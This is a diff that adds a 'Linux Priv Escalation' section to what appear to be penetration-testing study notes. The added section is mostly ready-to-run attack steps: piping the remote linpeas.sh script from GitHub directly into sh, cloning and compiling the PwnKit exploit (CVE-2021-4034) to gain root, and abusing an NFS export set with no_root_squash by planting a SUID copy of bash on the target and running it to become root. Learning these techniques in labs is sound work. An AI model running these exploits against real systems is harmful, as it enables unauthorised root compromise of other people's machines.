@@ -1289,6 +1289,93 @@ paste the private key (save and exit ctrl +s and ctrl+x)
 chmod 600 id_rsa
 ssh root@TargetIP -p PORTNO -i id_rsa
 
+
+**Linux Priv Escalation**
+
+1. PkExec
+
+whoami
+sudo -l
+Google linPEAS github
+
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+Here we'll exploit PwnKIT exploit
+
+Google pwnkit github (CVE-2021-4034/pwnkit.c at main)
+
+Code->copy link
+
+cd /tmp
+git clone URL LINK
+
+cd CVE-2021-4034/
+ls
+make
+
+whoami
+./cve-2021-4034
+whoami
+sudo -l
+
+2. Misconfigured NFS Shares
+
+(On Linux machine)
+sudo apt-get update
+sudo apt install nfs-kernel-server
+nano /etc/exports
+
+Add following entry: /home	*(rw,no_root_squash)
+
+Close the file
+Restart the server
+
+sudo /etc/init.d/nfs-kernel-server restart
+
+Move to Attacker machine (parrotOS)
+
+sudo nmap -sV TARAGETIP 
+
+notice port 2049 being open here
+
+sudo apt-get install nfs-common
+
+showmount -e TargetIP  #to show all the shares
+
+alternative: 
+
+sudo nmap -sV --script=nfs-showmount 10.10.1.9 #to list all NFS shares
+
+mkdir /tmp/nfs
+sudo mount -t nfs TargetIP:/home /tmp/nfs
+
+cd /tmp/nfs
+
+sudo cp /bin/bash .
+
+sudo chmod +s bash
+
+ls -la
+
+sudo df -h #to see space on drives
+
+New Terminal:
+
+ssh ubuntu@TargetIP
+
+whoami
+
+cd /home
+./bash -p
+
+id
+
+whoami
+
+
+
+--------------------------------------------------------------------------------------------------
+
 Finding FQDN of DC
 
 nmap -A -sV IPAddress
